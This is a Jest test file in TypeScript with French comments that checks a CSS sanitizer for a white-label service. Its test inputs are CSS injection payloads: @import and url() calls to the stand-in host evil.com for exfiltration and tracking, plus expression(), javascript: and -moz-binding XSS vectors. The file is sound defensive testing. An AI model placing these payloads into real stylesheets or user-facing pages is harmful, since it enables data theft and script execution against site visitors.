/**
 * Security Test — CSS Injection (White Label)
 *
 * Vérifie que la fonction sanitizeCss du WhiteLabelService
 * bloque les vecteurs d'attaque CSS courants :
 *   - @import (exfiltration via URL externe)
 *   - url() (chargement de ressources externes)
 *   - expression() (IE CSS injection)
 *   - javascript: (XSS via CSS)
 *   - -moz-binding (XBL binding, ancien Firefox)
 */

// On importe directement le module pour tester la fonction sanitize
// sans avoir besoin de monter toute l'application

describe('[SECURITY] CSS Injection — sanitizeCss', () => {
  // Reproduit la même logique que WhiteLabelService.sanitizeCss
  function sanitizeCss(raw: string): string {
    return raw
      .replace(/@import\s+[^;]+;?/gi,              '')
      .replace(/url\s*\([^)]*\)/gi,                '')
      .replace(/expression\s*\([^)]*\)/gi,         '')
      .replace(/javascript\s*:/gi,                 '')
      .replace(/-moz-binding\s*:[^;]+;?/gi,        '');
  }

  it('should strip @import directives', () => {
    const input = '@import url("https://evil.com/steal.css"); .ok { color: red; }';
    const result = sanitizeCss(input);
    expect(result).not.toContain('@import');
    expect(result).toContain('.ok');
  });

  it('should strip url() references', () => {
    const input = 'body { background-image: url(https://evil.com/track.png); color: blue; }';
    const result = sanitizeCss(input);
    expect(result).not.toContain('url(');
    expect(result).toContain('color: blue');
  });

  it('should strip IE expression()', () => {
    const input = 'div { width: expression(document.body.clientWidth); }';
    const result = sanitizeCss(input);
    expect(result).not.toContain('expression');
  });

  it('should strip javascript: protocol in CSS', () => {
    const input = 'a { background: javascript:alert(1); color: green; }';
    const result = sanitizeCss(input);
    expect(result).not.toContain('javascript:');
    expect(result).toContain('color: green');
  });

  it('should strip -moz-binding', () => {
    const input = 'body { -moz-binding: url("chrome://xbl/exploit.xml#foo"); }';
    const result = sanitizeCss(input);
    expect(result).not.toContain('-moz-binding');
  });

  it('should handle combined attack vectors', () => {
    const input = `
      @import url("https://evil.com/exfil.css");
      body {
        background: url(https://evil.com/pixel.gif);
        width: expression(alert('xss'));
        color: javascript:alert(1);
        -moz-binding: url("data:text/xml,...");
      }
      .safe { margin: 10px; padding: 5px; }
    `;
    const result = sanitizeCss(input);
    expect(result).not.toContain('@import');
    expect(result).not.toContain('url(');
    expect(result).not.toContain('expression');
    expect(result).not.toContain('javascript:');
    expect(result).not.toContain('-moz-binding');
    expect(result).toContain('.safe');
    expect(result).toContain('margin: 10px');
  });

  it('should handle case-insensitive variants', () => {
    const cases = [
      { input: '@IMPORT url("evil");',         forbidden: '@import' },
      { input: 'URL("evil")',                  forbidden: 'url(' },
      { input: 'EXPRESSION(evil)',             forbidden: 'expression' },
      { input: 'a { color: JavaScript:evil }', forbidden: 'javascript:' },
      { input: '-MOZ-BINDING: url("evil");',   forbidden: '-moz-binding' },
    ];
    for (const { input, forbidden } of cases) {
      const result = sanitizeCss(input);
      expect(result.toLowerCase()).not.toContain(forbidden.toLowerCase());
    }
  });

  it('should preserve safe CSS properties', () => {
    const input = `
      .container { display: flex; gap: 1rem; }
      .text { font-size: 14px; line-height: 1.5; color: #333; }
      :root { --primary: #2563eb; --radius: 8px; }
    `;
    const result = sanitizeCss(input);
    expect(result).toContain('display: flex');
    expect(result).toContain('font-size: 14px');
    expect(result).toContain('--primary: #2563eb');
  });
});
